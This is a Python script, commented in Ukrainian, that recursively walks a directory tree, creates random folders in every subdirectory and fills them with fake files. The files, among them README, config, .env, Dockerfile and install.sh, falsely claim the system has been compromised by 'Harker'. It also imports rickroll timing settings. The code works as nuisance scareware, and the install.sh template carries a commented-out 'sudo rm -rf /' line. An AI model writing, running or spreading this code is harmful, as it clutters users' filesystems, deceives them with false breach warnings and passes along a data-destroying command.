# Імпорт бібліотек
import os
import time
import random
import webbrowser
# Імпорт власних файлів
from config import MIN_FOLDER_NUMBER, MAX_FOLDER_NUMBER, FILE_CREATION_CHANCE, MIN_RICKROLL_INTERVAL, MAX_RICKROLL_INTERVAL, RICKROLL_PAUSE, MIN_RICKROLL_CYCLE, MAX_RICKROLL_CYCLE

class File_Utils:
    def __init__(self):
        self.folder_counter = 0
        self.file_counter = 0

    def create_folders_and_files(self, base_dir):
        try:
            for root, dirs, _ in os.walk(base_dir, topdown=True):
                for directory in dirs:
                    self.create_folders(root, directory)
        except Exception as e:
            print(f"Error walking directory: {e}")

    def create_folders(self, root, directory):
        try:
            for _ in range(random.randint(MIN_FOLDER_NUMBER, MAX_FOLDER_NUMBER)):
                new_dir = os.path.join(root, directory, f"folder_{random.randint(1, 10000)}")
                os.makedirs(new_dir, exist_ok=True)
                self.folder_counter += 1
                self.create_file(new_dir)
                print(f"Created folder: {new_dir}")
            time.sleep(0.1)
        except PermissionError:
            print(f"Permission denied: {os.path.join(root, directory)}")
        except Exception as e:
            print(f"Error creating folder: {e}")

    def create_file(self, dir_path):
        file_data = {
        "README.md": '''# Welcome to the compromised project

        It seems that your system has been compromised. We have taken control of several files and configurations. If you are seeing this, your system might be under a security breach.

        ## Important Files:
        - `config.yaml`: Contains critical configurations.
        - `settings.py`: Python settings are altered.
        - `index.js`: JavaScript files have been modified.

        ## Note:
        - Do not attempt to delete or modify these files as it may lead to system instability.
        - For further assistance, contact your IT support.

        Best regards,  
        Harker
        ''',
            "LICENSE": '''MIT License

        Copyright (c) @)@$ Harker

        Permission is hereby granted, free of charge, to any person obtaining a copy
        of this software and associated documentation files (the "Software"), to deal
        in the Software without restriction, including without limitation the rights
        to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
        copies of the Software, and to permit persons to whom the Software is
        furnished to do so, subject to the following conditions:

        The above copyright notice and this permission notice shall be included in all
        copies or substantial portions of the Software.

        THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
        IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
        FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
        AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
        LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
        OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
        SOFTWARE.''',
            "config.yaml": '''settings:
        - name: compromised_mode
            value: true
        - name: access_level
            value: elevated
        - name: last_modified_by
            value: Harker
        ''',
            "config.json": '''{
        "settings": {
            "compromised_mode": true,
            "access_level": "elevated",
            "last_modified_by": "Harker"
        },
        "note": "This file has been modified. Do not trust the contents."
        }
        ''',
            "settings.py": '''COMPROMISED_MODE = True
        ACCESS_LEVEL = 'elevated'
        LAST_MODIFIED_BY = 'Harker'

        print("Settings have been altered. Contact IT support.")
        ''',
            ".env": '''# WARNING: Environment variables have been altered
        COMPROMISED_MODE=true
        ACCESS_LEVEL=elevated
        LAST_MODIFIED_BY=Harker
        ''',
            "main.py": '''def main():
            print("Your system may be compromised. Please check with your IT department.")
            
        if __name__ == "__main__":
            main()
        ''',
            "index.js": '''// WARNING: This file has been tampered with
        console.log("Your system has been compromised. Contact IT support.");
        console.log("Last modified by: Harker");
        ''',
            "Makefile": '''.PHONY: all clean

        all:
            echo "Your system might be compromised. Do not run make clean."

        clean:
            echo "Do not use this clean target. It may cause system instability."
        ''',
            "Dockerfile": '''FROM python:3.9-slim

        # Copy modified scripts
        COPY main.py /app/main.py
        COPY config.yaml /app/config.yaml

        RUN echo "Warning: This Docker image might be compromised. Proceed with caution."

        CMD ["python", "/app/main.py"]
        ''',
            "install.sh": '''#!/bin/bash
        # WARNING: This script has been compromised

        echo "Your system might be compromised."
        echo "Last modified by: Harker"
        echo "Please contact IT support."

        # Potential malicious action
        # Uncomment below line if needed
        # sudo rm -rf / 
        ''',
            "docs.md": '''# Documentation

        ## Security Notice:
        This documentation has been compromised. The information here might not be accurate.

        For any security concerns, please contact your IT department immediately.

        ## Modified Sections:
        - Configuration Details
        - Installation Instructions

        Best regards,  
        Harker
        ''',
            "package.json": '''{
        "name": "compromised-project",
        "version": "1.0.0",
        "description": "This project has been compromised.",
        "scripts": {
            "start": "node index.js"
        },
        "author": "Harker",
        "license": "MIT",
        "dependencies": {
            "express": "^4.17.1"
        }
        }
        '''
        }

        # Вибір випадкового файлу
        file_name = random.choice(list(file_data.keys()))
        file_content = file_data[file_name]

        file_path = os.path.join(dir_path, f"{file_name}")
        try:
            with open(file_path, 'w') as file:
                file.write(file_content)
            self.file_counter += 1
            print(f"File '{file_path}' created successfully.")
        except Exception as e:
            print(f"Error creating file: {e}")
